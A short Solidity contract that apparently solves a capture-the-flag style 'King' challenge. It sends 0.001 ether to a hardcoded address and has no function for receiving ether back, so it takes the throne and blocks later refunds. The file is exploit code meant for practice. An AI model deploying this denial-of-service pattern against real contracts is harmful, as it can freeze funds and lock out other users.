// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./King.sol";

contract MySolution {
  bool public paid = false;
  constructor() payable {}
  function run() external {
    (bool success,) = payable(0x06cd7788D77332cF1156f1E327eBC090B5FF16a3).call{ value: 0.001 ether }("");
    require(success, "Transfer failed");

    paid = true;
  }
}
